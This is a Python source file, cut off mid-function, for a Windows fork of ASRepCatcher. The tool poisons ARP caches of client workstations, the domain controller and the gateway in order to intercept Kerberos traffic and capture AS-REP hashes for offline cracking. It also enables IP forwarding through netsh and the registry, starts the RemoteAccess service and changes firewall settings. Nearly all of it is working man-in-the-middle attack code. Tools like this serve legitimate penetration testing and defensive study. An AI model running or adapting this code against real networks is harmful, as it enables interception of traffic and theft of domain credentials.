#!/usr/bin/env python3

# Authors : Yassine OUKESSOU, Samara Eli

from scapy.all import *
from scapy.layers.l2 import Ether, ARP
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import sendp, send, srp, sniff
from scapy.config import conf
from scapy.arch import get_if_list, get_if_addr
from scapy.packet import Packet, bind_layers, Raw
from scapy.fields import XIntField, StrField
from scapy.layers.kerberos import *
from scapy.asn1.asn1 import ASN1_INTEGER
from scapy.layers.l2 import getmacbyip

import asn1
import os
import subprocess
import argparse
import time
import threading
import ipaddress
from termcolor import colored
import socket
import asyncio
import logging
import netifaces
import ctypes
import sys
import re
import tempfile
import signal
import atexit
from datetime import datetime
import struct

# Rich library imports for enhanced formatting (scrolling output only)
from rich.console import Console
from rich.text import Text

import time
import struct

# Global variables
decoder = asn1.Decoder()
stop_arp_spoofing_flag = threading.Event()
cleanup_performed = False  # Flag to prevent multiple cleanup calls

# Rich display management (simplified)
console = Console()

# Global variables that will be set in main()
mode = None
outfile = None
usersfile = None
HashFormat = None
iface = None
disable_spoofing = None
stop_spoofing = None
gw = None
dc = None
debug = None
hwsrc = None
Targets = None
InitialTargets = None
TargetsList = None
UsernamesCaptured = {}
UsernamesSeen = set()
AllUsernames = set()
firewall_backup_file = None
original_ip_forward = None
relay_port = 88
skip_redirection = False

# Debug message scroll (simplified)
debug_messages = []
MAX_DEBUG_MESSAGES = 10


# =======================================
# LOGGING FUNCTIONS (with Rich formatting)
# =======================================

def add_debug_message(message):
    """Add a debug message to the scrolling display"""
    global debug_messages
    debug_messages.append(f"[{datetime.now().strftime('%H:%M:%S')}] {message}")
    if len(debug_messages) > MAX_DEBUG_MESSAGES:
        debug_messages.pop(0)

def print_setup_banner():
    """Print the setup banner using Rich"""
    banner_text = """
╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    █████╗ ███████╗██████╗ ███████╗██████╗  ██████╗ █████╗ ████████╗ ██████╗██╗  ██╗███████╗██████╗     ║
║   ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔════╝██║  ██║██╔════╝██╔══██╗    ║
║   ███████║███████╗██████╔╝█████╗  ██████╔╝██║     ███████║   ██║   ██║     ███████║█████╗  ██████╔╝    ║
║   ██╔══██║╚════██║██╔══██╗██╔══╝  ██╔═══╝ ██║     ██╔══██║   ██║   ██║     ██╔══██║██╔══╝  ██╔══██╗    ║
║   ██║  ██║███████║██║  ██║███████╗██║     ╚██████╗██║  ██║   ██║   ╚██████╗██║  ██║███████╗██║  ██║    ║
║   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ║
║                                                                                                        ║
║                                  Windows Edition - Enhanced Interface                                  ║
║                            Authors:  Samara Eli, forked from Yassine OUKESSOU                          ║
║                                              Version: 0.0.1                                            ║
╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝
    """
    console.print(Text(banner_text.strip(), style="bold cyan"))

def rich_print_info(message, style="cyan"):
    """Print info message using Rich scrolling output"""
    console.print(f"[{style}][*][/{style}] {message}")
    add_debug_message(f"[INFO] {message}")

def rich_print_success(message):
    """Print success message using Rich scrolling output"""
    console.print(f"[bold green][+][/bold green] {message}")

def rich_print_warning(message):
    """Print warning message using Rich scrolling output"""
    console.print(f"[bold yellow][!][/bold yellow] {message}")
    add_debug_message(f"[WARN] {message}")

def rich_print_error(message):
    """Print error message using Rich scrolling output"""
    console.print(f"[bold red][!][/bold red] {message}")
    add_debug_message(f"[ERROR] {message}")

def rich_print_hash(username, domain, etype, hash_string):
    """Print captured hash with Rich formatting (scrolling)"""
    console.print("")
    console.print(f"[bold green]{'='*60}[/bold green]")
    console.print(f"[bold green] HASH CAPTURED! [/bold green]")
    console.print(f"[bold cyan]Username:[/bold cyan] {username}@{domain}")
    console.print(f"[bold yellow]Encryption Type:[/bold yellow] {etype}")
    console.print(f"[bold green]Hash:[/bold green] {hash_string}")
    console.print(f"[bold green]{'='*60}[/bold green]")
    console.print("")

# =======================================
# WINDOWS NETWORKING SETUP
# =======================================

def setup_windows_networking():
    """Enhanced Windows networking setup for relay mode"""
    rich_print_info("[SETUP] Configuring Windows networking for AS-REP capture...", "yellow")
    
    try:
        # Check current IP forwarding status
        result = subprocess.run(
            ['netsh', 'interface', 'ipv4', 'show', 'global'],
            capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        rich_print_info(f"[SETUP] Current IP forwarding status checked", "blue")
        
        # Enable IP forwarding on Windows
        try:
            subprocess.run(
                ['netsh', 'interface', 'ipv4', 'set', 'global', 'forwarding=enabled'],
                check=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
            )
            rich_print_success("[SETUP] ✓ IP forwarding enabled", "green")
        except subprocess.CalledProcessError as e:
            rich_print_warning(f"[SETUP] IP forwarding command failed (may need admin): {e}")
        
        # Show network interface information
        try:
            interface_result = subprocess.run(
                ['netsh', 'interface', 'ipv4', 'show', 'interfaces'],
                capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW
            )
            if interface_result.returncode == 0:
                rich_print_info("[SETUP] Network interfaces information logged", "blue")
        except Exception as e:
            rich_print_info(f"[SETUP] Interface check skipped: {e}", "blue")
            
        rich_print_info("[SETUP] Windows networking configuration complete", "green")
        rich_print_warning("[RELAY] Note: If AS-REP still bypasses VM, consider ARP spoofing")
        
    except Exception as e:
        rich_print_error(f"[SETUP] Windows networking setup error: {e}")

# =======================================
# SIGNAL HANDLING AND CLEANUP
# =======================================

def check_port_usage(port=88):
    """Check what processes are using the specified port"""
    try:
        result = subprocess.run(['netstat', '-ano'], capture_output=True, text=True, timeout=5)
        lines = result.stdout.split('\n')
        port_lines = [line for line in lines if f':{port} ' in line and 'LISTENING' in line]
        
        if port_lines:
            rich_print_warning(f'[PORT CHECK] Found processes using port {port}:')
            for line in port_lines:
                parts = line.split()
                if len(parts) >= 5:
                    pid = parts[-1]
                    rich_print_info(f'[PORT CHECK] PID {pid}: {line.strip()}', 'yellow')
                    
                    # Try to get process name
                    try:
                        tasklist_result = subprocess.run(['tasklist', '/FI', f'PID eq {pid}'], 
                                                       capture_output=True, text=True, timeout=3)
                        if tasklist_result.returncode == 0:
                            tasklist_lines = tasklist_result.stdout.split('\n')
                            for tl in tasklist_lines:
                                if pid in tl:
                                    rich_print_info(f'[PORT CHECK] Process: {tl.strip()}', 'cyan')
                                    break
                    except:
                        pass
            return True
        else:
            rich_print_success(f'[PORT CHECK] Port {port} appears to be free')
            return False
    except Exception as e:
        rich_print_warning(f'[PORT CHECK] Could not check port usage: {e}')
        return False

def cleanup_port_88():
    """Clean up anything that might be using port 88"""
    rich_print_info('[CLEANUP] Checking for port 88 conflicts...', 'yellow')
    
    # First clean up our own traffic redirection
    cleanup_traffic_redirection()
    
    # Check if port is still in use
    if check_port_usage(88):
        rich_print_warning('[CLEANUP] Port 88 is still in use after cleanup')
        rich_print_info('[CLEANUP] This might be Windows Kerberos service or another application', 'yellow')
        rich_print_info('[CLEANUP] Consider stopping conflicting services or using --disable-spoofing mode', 'yellow')
        return False
    
    return True

def cleanup_all():
    """Comprehensive cleanup function called on exit."""
    global firewall_backup_file, original_ip_forward, stop_arp_spoofing_flag, cleanup_performed
    
    # Prevent multiple cleanup calls
    if cleanup_performed:
        return
    cleanup_performed = True
    
    try:
        # Stop ARP spoofing
        if not disable_spoofing:
            stop_arp_spoofing_flag.set()
            if 'Targets' in globals() and Targets is not None:
                rich_print_info('Restoring ARP cache, please hold...')
                restore_all_targets()
    except Exception as e:
        if debug:
            rich_print_error(f'Error during ARP cleanup: {e}')
    
    try:
        # Clean up traffic redirection and port bindings
        cleanup_port_88()
    except Exception as e:
        if debug:
            rich_print_error(f'Error during traffic redirection cleanup: {e}')
    
    try:
        # Restore IP forwarding
        if original_ip_forward is not None:
            restore_ip_forwarding(original_ip_forward)
            if debug:
                rich_print_success('Restored original IP forwarding setting')
    except Exception as e:
        if debug:
            rich_print_error(f'Error restoring IP forwarding: {e}')
    
    try:
        # Restore firewall rules
        if firewall_backup_file is not None:
            restore_firewall_rules(firewall_backup_file)
            if debug:
                rich_print_success('Restored firewall backup')
    except Exception as e:
        if debug:
            rich_print_error(f'Error restoring firewall: {e}')

def signal_handler(sig, frame):
    """Handle signals for graceful shutdown."""
    
    console.print(f'\n[bold yellow][*][/bold yellow] Received interrupt signal {sig}, cleaning up...')
    if debug:
        console.print(f'[dim][DEBUG] Signal handler called from frame: {frame}[/dim]')
    
    # Set the global stop flags immediately
    try:
        stop_arp_spoofing_flag.set()
    except NameError:
        pass  # Flag might not be initialized yet
    
    try:
        cleanup_all()
    except Exception as e:
        console.print(f'[bold red][!][/bold red] Error during cleanup: {e}')
    finally:
        console.print('[bold green][*][/bold green] Cleanup completed, exiting...')
        
        # Print final summary if we have captured data
        try:
            if (UsernamesCaptured and len(UsernamesCaptured) > 0) or (UsernamesSeen and len(UsernamesSeen) > 0):
                console.print("\n[bold green]Session Summary[/bold green]")
                console.print(f"[green]Hashes Captured:[/green] {len(UsernamesCaptured)}")
                console.print(f"[blue]Usernames Seen:[/blue] {len(UsernamesSeen)}")
                console.print(f"[yellow]Output File:[/yellow] {outfile}")
                console.print(f"[cyan]Users File:[/cyan] {usersfile}")
        except NameError:
            pass  # Variables might not be initialized yet
        
        # Force exit immediately - don't wait for anything
        try:
            os._exit(0)
        except:
            # Last resort
            import sys
            sys.exit(1)

# =======================================
# UTILITY FUNCTIONS
# =======================================

def is_admin():
    """Check if the script is running with administrator privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def display_banner():
    """Display the ASRepCatcher banner using Rich formatting"""
    print_setup_banner()

def is_dc_up(dc):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((dc,88))
    sock.close()
    if result == 0:
        return True
    return False

def is_valid_ip_list(iplist):
    if not re.match(r'^(((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?),)*((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$', iplist) :
        return False
    return True

def is_valid_ipwithmask(ip_with_mask):
    if not re.match(r'^([01]?\d\d?|2[0-4]\d|25[0-5])(?:\.(?:[01]?\d\d?|2[0-4]\d|25[0-5])){3}(?:/[0-2]\d|/3[0-2])?$', ip_with_mask):
        return False
    return True



def valid_ip(address):
    try: 
        a = ipaddress.ip_address(address)
        return True
    except:
        return False

def get_available_interfaces():
    """Get list of available network interfaces with their details - Scapy compatible"""
    interfaces = []
    try:
        # Start with Scapy interface list - these are the names that actually work
        scapy_interfaces = get_if_list()
        
        for scapy_iface in scapy_interfaces:
            try:
                # Get IP address using Scapy
                ip_addr = get_if_addr(scapy_iface)
                
                # Skip interfaces without proper IP (like 0.0.0.0 or empty)
                if not ip_addr or ip_addr == '0.0.0.0':
                    continue
                
                # Get MAC address and other details
                mac_addr = 'N/A'
                netmask = 'N/A'
                
                try:
                    # Try to get additional details from netifaces if available
                    for neti_name in netifaces.interfaces():
                        try:
                            neti_addrs = netifaces.ifaddresses(neti_name)
                            if netifaces.AF_INET in neti_addrs:
                                neti_ip = neti_addrs[netifaces.AF_INET][0].get('addr', '')
                                if neti_ip == ip_addr:
                                    netmask = neti_addrs[netifaces.AF_INET][0].get('netmask', 'N/A')
                                    if netifaces.AF_LINK in neti_addrs:
                                        mac_addr = neti_addrs[netifaces.AF_LINK][0].get('addr', 'N/A')
                                    break
                        except:
                            continue
                except:
                    pass
                
                # Create a user-friendly display name
                display_name = scapy_iface
                if len(scapy_iface) > 25:
                    # Shorten long interface names for display
                    display_name = f"{scapy_iface[:12]}...{scapy_iface[-8:]}"
                
                interfaces.append({
                    'name': scapy_iface,  # This is the Scapy-compatible name
                    'display_name': display_name,
                    'ip': ip_addr,
                    'netmask': netmask,
                    'mac': mac_addr
                })
            except Exception as e:
                # Skip interfaces that cause errors
                continue
                
    except Exception as e:
        logging.error(f'[!] Could not enumerate interfaces: {e}')
    
    return interfaces

def select_interface():
    """Let user select network interface"""
    interfaces = get_available_interfaces()
    
    if not interfaces:
        rich_print_error('No network interfaces found with IPv4 addresses')
        return None
    
    # Display interface selection with Rich formatting
    console.print("\n[bold cyan]Available Network Interfaces:[/bold cyan]")
    console.print("[cyan]" + "="*80 + "[/cyan]")
    
    for i, iface_info in enumerate(interfaces):
        console.print(f"[cyan]{i+1:2}.[/cyan] [green]{iface_info['display_name']:<25}[/green] "
                     f"[yellow]{iface_info['ip']:<15}[/yellow] [magenta]{iface_info['mac']}[/magenta]")
    
    console.print("[cyan]" + "="*80 + "[/cyan]")
    
    while True:
        try:
            choice = console.input(f"\n[cyan]Select interface (1-{len(interfaces)}): [/cyan]").strip()
            if choice.isdigit():
                idx = int(choice) - 1
                if 0 <= idx < len(interfaces):
                    selected = interfaces[idx]
                    rich_print_success(f"Selected interface: {selected['display_name']} ({selected['ip']})")
                    # Return the actual Scapy name that will work
                    return selected['name']
            rich_print_warning(f"Please enter a number between 1 and {len(interfaces)}")
        except (KeyboardInterrupt, EOFError):
            rich_print_warning("Interface selection cancelled")
            return None
        except Exception as e:
            rich_print_error(f"Invalid input: {e}")

def get_temp_file_path(filename):
    """Get a cross-platform temporary file path."""
    temp_dir = tempfile.gettempdir()
    return os.path.join(temp_dir, filename)

# ============================================================================
# NETWORK CONFIGURATION FUNCTIONS
# ============================================================================

def get_ip_forwarding_status():
    """Get current IP forwarding status."""
    try:
        result = subprocess.run(['netsh', 'interface', 'ipv4', 'show', 'global'], 
                              capture_output=True, text=True, check=True, timeout=10)
        # Look for "Forwarding" in the output
        return "Enabled" in result.stdout and "Forwarding" in result.stdout
    except:
        return False

def enable_ip_forwarding():
    """Enable IP forwarding on Windows using both netsh and registry methods."""
    try:
        rich_print_info('[IP FORWARD] Enabling Windows IP forwarding for ARP spoofing...', 'yellow')
        
        # Method 1: Traditional netsh command
        result1 = subprocess.run(['netsh', 'interface', 'ipv4', 'set', 'global', 'forwarding=enabled'], 
                              capture_output=True, text=True, check=True, timeout=10)
        
        # Method 2: Registry method (CRITICAL for ARP spoofing to work properly)
        # This is the critical fix for Windows ARP spoofing + packet forwarding
        registry_result = subprocess.run([
            'reg', 'add', 
            'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters',
            '/t', 'REG_DWORD', 
            '/v', 'IPEnableRouter', 
            '/d', '1', 
            '/f'
        ], capture_output=True, text=True, timeout=10)
        
        # Method 3: ADDITIONAL Windows configuration for packet redirection
        # Enable routing on the specific interface - CRITICAL for ARP spoofing
        try:
            # This is often the missing piece for Windows ARP spoofing
            result_iface = subprocess.run([
                'netsh', 'interface', 'ipv4', 'set', 'interface', 
                f'interface="{iface}"', 'forwarding=enabled'
            ], capture_output=True, text=True, timeout=10)
            
            if result_iface.returncode == 0:
                rich_print_success('[IP FORWARD] ✓ Interface-specific routing enabled')
            else:
                rich_print_warning(f'[IP FORWARD] Interface routing warning: {result_iface.stderr}')
                
        except Exception as iface_e:
            rich_print_warning(f'[IP FORWARD] Interface config error: {iface_e}')
        
        # Method 4: Additional Windows routing service
        try:
            routing_result = subprocess.run(['sc', 'config', 'RemoteAccess', 'start=', 'auto'], 
                                          capture_output=True, text=True, timeout=10)
            start_result = subprocess.run(['sc', 'start', 'RemoteAccess'], 
                                        capture_output=True, text=True, timeout=10)
        except Exception as service_e:
            pass  # Service setup is optional
        
        # Return success if at least one method worked
        success = (result1.returncode == 0) or (registry_result.returncode == 0)
        if success:
            rich_print_success('[IP FORWARD] ✓ Windows IP forwarding enabled for ARP spoofing')
        
        return success
        
    except Exception as e:
        rich_print_error(f'[IP FORWARD] Could not enable IP forwarding on Windows: {e}')
        return False

def restore_ip_forwarding(original_status):
    """Restore IP forwarding to original status."""
    try:
        rich_print_info('[CLEANUP] Restoring IP forwarding settings...', 'yellow')
        
        # Method 1: Restore netsh setting
        status = 'enabled' if original_status else 'disabled'
        subprocess.run(['netsh', 'interface', 'ipv4', 'set', 'global', f'forwarding={status}'], 
                      capture_output=True, text=True, check=True, timeout=10)
        rich_print_info(f'[CLEANUP] ✓ netsh IP forwarding restored to {status}', 'green')
        
        # Method 2: Restore registry setting if we had disabled it
        if not original_status:
            registry_result = subprocess.run([
                'reg', 'add', 
                'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters',
                '/t', 'REG_DWORD', 
                '/v', 'IPEnableRouter', 
                '/d', '0', 
                '/f'
            ], capture_output=True, text=True, timeout=10)
            
            if registry_result.returncode == 0:
                rich_print_info('[CLEANUP] ✓ Registry IP forwarding restored to original state', 'green')
            else:
                rich_print_warning(f'[CLEANUP] Could not restore registry IP forwarding: {registry_result.stderr}')
        
        logging.info('[*] Restored IP forwarding value on Windows')
        
    except Exception as e:
        rich_print_warning(f'[CLEANUP] Could not restore IP forwarding on Windows: {e}')
        logging.error(f'[!] Could not restore IP forwarding on Windows: {e}')

# ============================================================================
# FIREWALL MANAGEMENT FUNCTIONS
# ============================================================================

def backup_firewall_rules():
    """Backup current Windows Firewall rules."""
    try:
        # Export Windows Firewall rules
        backup_file = get_temp_file_path('asrepcatcher_firewall_backup.wfw')
        
        # Remove existing backup file if it exists
        try:
            if os.path.exists(backup_file):
                os.remove(backup_file)
                logging.debug(f'[*] Removed existing backup file: {backup_file}')
        except Exception as remove_e:
            logging.debug(f'[*] Could not remove existing backup file: {remove_e}')
        
        # First, check if Windows Firewall service is running
        try:
            service_check = subprocess.run(['sc', 'query', 'MpsSvc'], 
                                         capture_output=True, text=True, check=True, timeout=10)
            if 'RUNNING' not in service_check.stdout:
                logging.warning('[!] Windows Firewall service (MpsSvc) is not running')
                logging.info('[*] Attempting to start Windows Firewall service...')
                try:
                    subprocess.run(['sc', 'start', 'MpsSvc'], 
                                 capture_output=True, text=True, check=True, timeout=15)
                    time.sleep(2)  # Give service time to start
                except:
                    logging.warning('[!] Could not start Windows Firewall service')
        except:
            logging.debug('[*] Could not check Windows Firewall service status')
        
        # Try the export command with detailed error reporting
        result = subprocess.run(['netsh', 'advfirewall', 'export', backup_file], 
                              capture_output=True, text=True, timeout=15)
        
        if result.returncode == 0:
            logging.debug(f'[*] Successfully backed up firewall rules to {backup_file}')
            return backup_file
        else:
            # Log the specific error
            logging.error(f'[!] netsh advfirewall export failed with return code {result.returncode}')
            logging.error(f'[!] stdout: {result.stdout}')
            logging.error(f'[!] stderr: {result.stderr}')
            
            # Try alternative backup method - just create a minimal backup
            logging.info('[*] Attempting alternative firewall backup method...')
            try:
                # Get current firewall state
                result2 = subprocess.run(['netsh', 'advfirewall', 'show', 'allprofiles'], 
                                       capture_output=True, text=True, check=True, timeout=10)
                
                # Save current state info to a text file for reference
                alt_backup_file = get_temp_file_path('asrepcatcher_firewall_state.txt')
                
                # Remove existing alternative backup file if it exists
                try:
                    if os.path.exists(alt_backup_file):
                        os.remove(alt_backup_file)
                        logging.debug(f'[*] Removed existing alternative backup file: {alt_backup_file}')
                except Exception as alt_remove_e:
                    logging.debug(f'[*] Could not remove existing alternative backup file: {alt_remove_e}')
                
                with open(alt_backup_file, 'w') as f:
                    f.write("ASRepCatcher Firewall State Backup\n")
                    f.write("=" * 50 + "\n")
                    f.write(result2.stdout)
                    f.write("\n\nNote: This is a state backup, not a restorable export.\n")
                    f.write("Manual firewall rule cleanup may be required.\n")
                
                logging.info(f'[*] Created alternative firewall state backup: {alt_backup_file}')
                return alt_backup_file
                
            except Exception as alt_e:
                logging.error(f'[!] Alternative backup method also failed: {alt_e}')
                
                # Final fallback - create an empty marker file
                marker_file = get_temp_file_path('asrepcatcher_no_firewall_backup.txt')
                
                # Remove existing marker file if it exists
                try:
                    if os.path.exists(marker_file):
                        os.remove(marker_file)
                        logging.debug(f'[*] Removed existing marker file: {marker_file}')
                except Exception as marker_remove_e:
                    logging.debug(f'[*] Could not remove existing marker file: {marker_remove_e}')
                
                with open(marker_file, 'w') as f:
                    f.write("No firewall backup available\n")
                    f.write("Manual cleanup may be required\n")
                
                logging.warning('[!] No firewall backup possible - continuing with marker file')
                logging.warning('[!] You may need to manually check firewall rules after execution')
                return marker_file
                
    except Exception as e:
        logging.error(f'[!] Could not back up Windows Firewall: {e}')
        
        # Create a marker file so the script can continue
        try:
            marker_file = get_temp_file_path('asrepcatcher_no_firewall_backup.txt')
            
            # Remove existing marker file if it exists
            try:
                if os.path.exists(marker_file):
                    os.remove(marker_file)
                    logging.debug(f'[*] Removed existing exception marker file: {marker_file}')
            except Exception as exc_remove_e:
                logging.debug(f'[*] Could not remove existing exception marker file: {exc_remove_e}')
            
            with open(marker_file, 'w') as f:
                f.write("Firewall backup failed\n")
                f.write("Manual cleanup may be required\n")
            logging.warning('[!] Created backup failure marker - continuing execution')
            return marker_file
        except:
            return None

def configure_firewall_forwarding():
    """Configure Windows Firewall for packet forwarding."""
    try:
        # Enable Windows Firewall forwarding
        subprocess.run(['netsh', 'advfirewall', 'set', 'global', 'statefulFTP', 'disable'], 
                      capture_output=True, text=True, check=True, timeout=15)
        subprocess.run(['netsh', 'advfirewall', 'set', 'global', 'statefulftp', 'disable'], 
                      capture_output=True, text=True, check=True, timeout=15)
        logging.debug('[*] Configured Windows Firewall for forwarding')
    except Exception as e:
        logging.error(f'[!] Could not configure Windows Firewall: {e}')

def cleanup_traffic_redirection():
    """Clean up Windows traffic redirection rules."""
    try:
        rich_print_info('[CLEANUP] Removing Windows port redirection rules...', 'yellow')
        
        # Remove Windows port proxy redirection for Kerberos (port 88)
        result = subprocess.run(['netsh', 'interface', 'portproxy', 'delete', 'v4tov4', 
                      'listenport=88', 'listenaddress=0.0.0.0'], 
                      capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            rich_print_success('[CLEANUP] Removed port 88 redirection rule')
        else:
            rich_print_info('[CLEANUP] No port 88 redirection rule to remove')
        
        # Also try to remove any alternative port redirections
        for alt_port in [8888, 8889, 8890]:
            try:
                subprocess.run(['netsh', 'interface', 'portproxy', 'delete', 'v4tov4', 
                              f'listenport={alt_port}', 'listenaddress=0.0.0.0'], 
                              capture_output=True, text=True, timeout=5)
            except:
                pass
        
        # Try to remove the firewall rules we added
        firewall_rules = ['ASRepCatcher_Kerberos', 'ASRepCatcher_Kerberos_8888', 'ASRepCatcher_Kerberos_8889']
        for rule_name in firewall_rules:
            try:
                result = subprocess.run(['netsh', 'advfirewall', 'firewall', 'delete', 'rule', 
                              f'name={rule_name}'], 
                              capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    rich_print_success(f'[CLEANUP] Removed firewall rule: {rule_name}')
            except Exception as fw_e:
                pass  # Rule might not exist
        
        # Give Windows time to release ports
        time.sleep(1)
        rich_print_success('[CLEANUP] Traffic redirection cleanup completed')
        logging.debug('[*] Cleaned up Windows port redirection for Kerberos')
            
    except Exception as e:
        rich_print_warning(f'[CLEANUP] Could not clean up Windows port redirection: {e}')
        logging.debug(f'[*] Could not clean up Windows port redirection: {e}')


def restore_firewall_rules(backup_file):
    """Restore Windows Firewall rules from backup."""
    if not backup_file:
        return
        
    try:
        # Clean up port redirection first
        subprocess.run(['netsh', 'interface', 'portproxy', 'delete', 'v4tov4', 
                      'listenport=88', 'listenaddress=0.0.0.0'], 
                      capture_output=True, text=True, timeout=10)
        
        # Check if this is a real backup file or just a marker
        if backup_file.endswith('_no_firewall_backup.txt'):
            logging.info('[*] No firewall backup to restore - cleaning up marker file')
            try:
                os.remove(backup_file)
            except:
                pass
            return
            
        if backup_file.endswith('_firewall_state.txt'):
            logging.info('[*] State-only backup detected - no automatic restore possible')
            logging.info('[*] Please check firewall rules manually if needed')
            try:
                os.remove(backup_file)
            except:
                pass
            return
        
        # Try to import the backup if it's a real .wfw file
        if backup_file.endswith('.wfw'):
            result = subprocess.run(['netsh', 'advfirewall', 'import', backup_file], 
                                  capture_output=True, text=True, timeout=15)
            
            if result.returncode == 0:
                logging.info("[*] Restored Windows Firewall rules")
            else:
                logging.warning(f'[!] Could not restore firewall rules: {result.stderr}')
                logging.info('[*] Please check firewall rules manually')
            
            # Clean up backup file
            try:
                os.remove(backup_file)
            except:
                pass
        else:
            logging.info('[*] Unknown backup file format - no restore attempted')
            
    except Exception as e:
        logging.error(f'[!] Could not restore Windows Firewall: {e}')
        logging.info('[*] Please check firewall rules manually')

# ============================================================================
# ARP SPOOFING FUNCTIONS
# ============================================================================

def get_mac_addresses(ip_list):
    # Check for interruption before ARP scan
    if stop_arp_spoofing_flag.is_set():
        return {}
    
    mac_addresses = {}
    try:
        ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_list),timeout=1,verbose=False, iface=iface, retry=1)
        for i in ans :
            mac_addresses[i[1].psrc] = i[1].hwsrc
    except Exception as e:
        pass
    
    return(mac_addresses)

def relaymode_arp_spoof(spoofed_ip):
    global Targets
    # mac_addresses = update_uphosts()
    mac_addresses = get_mac_addresses(TargetsList)
    
    # CRITICAL: Get DC MAC address for bidirectional spoofing
    dc_mac_addresses = get_mac_addresses([dc])
    if dc not in dc_mac_addresses:
        rich_print_error(f'[ARP RELAY] CRITICAL: Cannot get DC MAC address for {dc}')
        return
    
    dc_mac = dc_mac_addresses[dc]
    timer = 0
    
    rich_print_info(f'[ARP RELAY] Starting BIDIRECTIONAL relay mode ARP spoofing', 'yellow')
    rich_print_info(f'[ARP RELAY] Targets: {len(mac_addresses)} clients', 'yellow')
    rich_print_info(f'[ARP RELAY] DC: {dc} ({dc_mac})', 'yellow')
    rich_print_info(f'[ARP RELAY] Interface: {iface}, Source MAC: {hwsrc}', 'yellow')
    
    while not stop_arp_spoofing_flag.is_set() :
        if Targets != set() :
            packets_list = []
            
            # STEP 1: Poison CLIENT workstations (tell them DC is at our MAC)
            # This captures AS-REQ packets going TO the DC
            for target in mac_addresses :
                if stop_arp_spoofing_flag.is_set():
                    return
                
                # Tell client that DC is at our MAC address
                packet = Ether(src=hwsrc, dst=mac_addresses[target]) / ARP(op=2, hwsrc=hwsrc, psrc=dc, hwdst=mac_addresses[target], pdst=target)
                packets_list.append(packet)
                
                if debug:
                    rich_print_info(f'[ARP CLIENT] Poisoning {target}: telling them DC {dc} is at {hwsrc}', 'cyan')
            
            # STEP 2: Poison DC (tell it that ALL clients are at our MAC)
            # This captures AS-REP packets going FROM the DC
            for target in mac_addresses:
                if stop_arp_spoofing_flag.is_set():
                    return
                
                # Tell DC that each client is at our MAC address
                packet = Ether(src=hwsrc, dst=dc_mac) / ARP(op=2, hwsrc=hwsrc, psrc=target, hwdst=dc_mac, pdst=dc)
                packets_list.append(packet)
                
                if debug:
                    rich_print_info(f'[ARP DC] Poisoning DC: telling {dc} that client {target} is at {hwsrc}', 'cyan')
            
            if packets_list:
                rich_print_info(f'[ARP RELAY] Sending {len(packets_list)} bidirectional ARP spoof packets', 'yellow')
                sendp(packets_list, iface=iface, verbose=False)
                rich_print_success(f'[ARP RELAY] ✓ Sent {len(packets_list)} packets (clients + DC poisoned)', 'green')
            else:
                rich_print_warning('[ARP RELAY] No packets to send - target list empty')
        else:
            rich_print_warning('[ARP RELAY] No active targets for ARP spoofing')
        
        # Use shorter sleep and check stop flag more frequently
        for _ in range(10):  # Check stop flag every 0.1 seconds instead of waiting 1 full second
            if stop_arp_spoofing_flag.is_set():
                rich_print_info('[ARP RELAY] Stop flag detected, exiting ARP spoof thread', 'red')
                return
            time.sleep(0.1)
            
        timer += 1
        if timer == 3 :
            rich_print_info('[ARP RELAY] Updating target host list...', 'blue')
            mac_addresses = update_uphosts()
            timer = 0

def listenmode_arp_spoof():
    # CRITICAL: Use EXACT same method as working Linux version!
    # In listen mode, poison GATEWAY's ARP cache with ALL targets at once
    rich_print_info(f'[ARP LISTEN] LINUX METHOD: Batch gateway ARP poisoning', 'red')
    rich_print_info(f'[ARP LISTEN] Targets: {list(Targets)} ({len(Targets)} hosts)', 'yellow')
    rich_print_info(f'[ARP LISTEN] Gateway: {gw}, Interface: {iface}', 'yellow')
    
    try:
        gateway_mac = getmacbyip(gw)
        if not gateway_mac:
            rich_print_error(f'[ARP LISTEN] Cannot get gateway MAC for {gw}')
            return
        rich_print_info(f'[ARP LISTEN] Gateway MAC: {gateway_mac}, Our MAC: {hwsrc}', 'cyan')
    except Exception as e:
        rich_print_error(f'[ARP LISTEN] Error: {e}')
        return
    
    packet_count = 0
    
    try:
        while not stop_arp_spoofing_flag.is_set():
            if Targets != set():
                try:
                    # EXACT Linux method: Send single packet with ALL targets as sources
                    # This tells gateway: "ALL these target IPs are at MY MAC address"
                    # Original Linux code: sendp(Ether(src = hwsrc, dst=gateway_mac) / (ARP(op = 2, hwsrc = hwsrc, psrc = list(Targets))), iface=iface, verbose=False)
                    arp_packet = Ether(src=hwsrc, dst=gateway_mac) / ARP(
                        op=2,               # ARP Reply
                        hwsrc=hwsrc,        # Our MAC address
                        psrc=list(Targets)  # CRITICAL: ALL target IPs at once (Linux method)
                    )
                    
                    sendp(arp_packet, iface=iface, verbose=False)
                    packet_count += 1
                    
                    if packet_count % 10 == 0:
                        rich_print_success(f'[ARP LISTEN] ✓ Linux method: {packet_count} batch ARP packets sent')
                        rich_print_info(f'[ARP LISTEN] ✓ Told gateway: {len(Targets)} targets are at {hwsrc}', 'green')
                        add_debug_message(f"Batch ARP #{packet_count}: {len(Targets)} targets -> gateway")
                    
                except Exception as e:
